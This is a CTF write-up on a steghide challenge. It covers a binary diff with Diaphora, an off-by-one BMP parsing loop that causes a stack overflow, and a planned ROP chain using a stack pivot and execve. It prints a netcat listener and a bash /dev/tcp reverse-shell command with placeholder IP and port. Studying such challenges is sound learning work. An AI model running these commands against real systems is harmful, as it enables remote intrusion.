# Task 6

<h4> This challenge provides 2 binaries <b> steghide (vulnerable)</b> and <b> steghide_patched (fixed)</b> and a dockerfile with some set up directories for docker build <h4>

## How the challenge works

This challenge is completely different from others which I've solved.

The challenge's name is steghide, it is a tool to extract hidden messages inside an image when enter correct passphrase.

You can see exactly how it works when you build a docker. The server will act as a virtual web, taking our images then automatically run a sub-process with the command-line below: 

```
steghide extract -sf 'our_image' -p 'our_passphrase' -xf outfile_name
```

--> So the bug definitely exists in this command

## How to find the bugs 
We have already known what command-line triggers the bug , so the next thing is what function has bugs.

At this point, I'll use a new techinque: <b> binary diff </b>

<h4> To diff 2 different binary, we need to get a SQLite file type of the first binary. Then use that SQlite file to diff with the second binary, respectively. </h4>

- I'll install and use diaphora tool for this techinque as follows:

```
git clone https://github.com/joxeankoret/diaphora.git
```
- After that, open IDA with decompiled binary and choose:
```
file --> script file --> select /path/to/diaphora_file/diaphora.py --> open
```
In my case, /path/to/diaphora_file = <b> /home/saitomu/diaphora </b>

- First binary: just click <b> ok </b> --> get SQLite file

<img width="945" height="165" alt="image" src="https://github.com/user-attachments/assets/036cc7ed-85d7-4ca1-ab25-f99ca08d7474" />

- Second binary: Choose <b> steghide.sqlite </b> then click <b> ok </b>

<img width="935" height="168" alt="image" src="https://github.com/user-attachments/assets/c308d964-6dce-405f-a235-db31e88ddce7" />

- After that, focus on <b> partial matches </b> tab

<img width="1544" height="102" alt="image" src="https://github.com/user-attachments/assets/5daa8bb8-cfb8-4042-a421-7bf07a81765d" />

<p>
Partial matches tab appear when there are small differences between 2 binary, meaning the author just changes some line of codes

In this case, the author changed the following block of codes:
- Unpatched:
```
  for ( i = 0; i <= height; ++i ) // It loops one more than the patched one

  {
    for ( j = 0; j < linelength; ++j )
    {
      BinIO = (BinaryIO *)CvrStgFile::getBinIO(this);
      current_ptr = (_BYTE *)std::vector<unsigned char>::operator[]((_QWORD *)this + 21, j + i * linelength);
      *current_ptr = BinaryIO::read8(BinIO);
      LODWORD(numread) = numread + 1;
    }
...
```
- Patched:
```
  for ( i = 0; i < height; ++i )
  {
    for ( j = 0; j < linelength; ++j )
    {
      BinIO = (BinaryIO *)CvrStgFile::getBinIO(this);
      current_ptr = (_BYTE *)std::vector<unsigned char>::operator[]((_QWORD *)this + 21, j + i * linelength);
      *current_ptr = BinaryIO::read8(BinIO);
      LODWORD(numread) = numread + 1;
    }
...
```

The flow of the program is: 
```
read meta data of BMP file 
--> get height and width --> copy data of that file into heap 
--> ...
```
- Because the loop execute one more time than usual, it works as following:
```
loop number > height
--> triggers EOF 
--> call __cxa_throw 
--> somehow go to BmpFile::getdata 
--> copy data from heap to stack 
--> call getheaders 
--> memcpy again to the stack 
--> triggers bof
```

</p>

## Exploit the program
Now we just need to ROP-chain to call shell after getting bof

- Security check of vulnerable program:

```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
Stripped:   No
```

* Here is my method to get shell by ROP-chain:
1. Memcpy all of data again to bss 
2. Stack pivot to that area
3. Call execve with reverse shell

### Reverse shell
As usual, We use execve(/bin/sh, 0, 0) to get normal shell. But in this challenge, it is a bit different. The challenge acts as a virtual web. It only receive our upload file then <b> read </b> it in <b> sub-process </b>

In other words, we just upload our payload file on the server and <b> leave instantly </b>. The server reads it alone without interact with us (only gives the result). So if I use the normal method, I'll fail to win

The best method is using reverse shell:
- Make the server's sub-process connects and gives shell in my local host server by its choice (controlled by us)

Note that I need to create local host first:
```
nc -lvnp 9001
```

Here is how to call reverse shell using execve:

- RDI: Pointer to b'/bin/bash'

- RSI: Pointer to an array of string pointers:
   <b>
  1. Pointer to b'/bin/bash'
  2. Pointer to b'-c'
  3. Pointer to b"bash -i >& /dev/tcp/YOUR_IP/LOCAL_OPENING_PORT 0>&1"
  4. Pointer to NULL
    </b>

- RDX: NULL

- RAX: 0x3b
 
Then <b> SYSCALL </b>

I can get my IP by using:
```
ip addr
```
or
```
ip a
```
Because my target is my own docker so I can just find <b>docker0 </b> section and get my local IP from line:
```
inet 172.17.0.1/16 brd ...
```
If your target is the event's server, do the same with <b> wlp2s0 </b> section, that is your real internet IP

Now go to web server to send our evil file and win!!

<img width="1297" height="269" alt="image" src="https://github.com/user-attachments/assets/833ba54e-056d-486e-8273-4ea9c86b19c0" />

<img width="853" height="616" alt="image" src="https://github.com/user-attachments/assets/c1e72aa9-ce90-4f3b-a753-5cf7ae1eea55" />
